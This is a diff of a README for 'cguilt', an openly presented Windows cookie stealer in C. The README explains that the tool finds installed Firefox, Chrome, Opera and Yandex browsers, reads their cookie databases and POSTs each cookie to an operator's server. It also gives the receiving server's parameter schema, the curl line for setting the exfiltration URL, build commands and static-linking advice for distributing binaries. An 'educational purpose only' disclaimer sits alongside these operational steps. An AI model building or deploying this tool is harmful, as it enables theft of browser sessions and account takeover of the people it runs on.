@@ -1,26 +1,26 @@
 # cguilt
-Kinda experiment field with cookies in Windows. As it is said above, it's just for educational purpose only. Have dependencies, also runtime one. So, to build it you'll need **libcurl** and **sqlite3**. Also libcurl should be static linked, because otherwise binary won't work on other machines. The explanation here is because the **libcurl.dll** is requred in runtime, so you need to link it static somehow.
+Complete raw cookie stealer for MS Windows. Educational purpose only. Have runtime dependencies, such as `libcurl`. Binaries are not distributed for obvious reason. Also cookies are not decrypted for some reason, but I'm one hundred percent working on it. Maybe.
 
-### # faq
-**Q.** *What is this exactly and how it works?*
+Working principe just pretty simple: first checks what browsers are currently installed on the local machine. There is only four variants for now *(Firefox, Chrome, Opera, Yandex)*, then reads their cookie file databases and sends content to your server through API requests. Really simple, huh.
 
-**A.** It's really simple cookie stealler, which, as I already said twice, was written just for fun and some practice of course. It's just checks what browsers are currently installed at the local machine and reads it's cookies database files, then send them to other server through curl with api requests.
+If you want to build your own binary, click ![here](https://github.com/vulpes-solis/cguilt#build). You also you need a serverside to accept incoming POST requests with some query params in it. To check the template of imcoming params, click ![here](https://github.com/vulpes-solis/cguilt#query-template).
 
-**Q.** *How can I use it?*
+## query template
+In incoming API requests query schema has three parametrs:
+1. `host`. Cookie host value. Cguilt sending cookies one-by-one, so the one request is the one cookie pair. String, max 128 chars long.
+2. `value`. Cookies content value. String, max 1024 chars long.
+3. `b_type`. Browser type. Not exactly every browsers here, but only Chromium in general (= 1) and Gecko (= 2).
 
-**A.** Just build it from sources like many other programs. In fact, I don't think it is really usefull stuff, but if you want - you're welcome. Also, this thing is still pretty raw and I actually have not yet compitely tested it on other machines. But issues here is always open, so if you want to improve for some reason...
-
-### # quo vadis?
-As it is can be somehow harmful, the main purpose of this thing is practice and education. That's all...
-
-### # build
-Install **libcurl** and **sqlite3** libs. Before compilation change destination server adress in 40th string in ***send.c***:
+## build
+Install `libcurl` and `sqlite3` libs. Before compilation change destination server adress in 40th string in `send.c`:
 ```c
 curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/api_post");
 ```
-Also you need a serverside to accept the incoming POST requests. Enjoy.
-
-Compile everything. Btw you need somehow link libcurl as static. Purpose of that is written above.
+Compile everything.
 ```bash
 $ gcc -o <name> main.c send.c `pkg-config --cflags --libs sqlite3 libcurl`
 ```
+Also *if you want to distribute your own binary, which I one hundred percent condemn* you need to link the `libcurl` library as static, because it's required in runtime.
+
+## quo vadis?
+As it is can be somehow comnsidered harmful, the main purpose of this thing is practice and education. There is no goal of anything else. If you got a bug or just want to help to improve this thing - you are always welcome. Send bugreports in issues. 
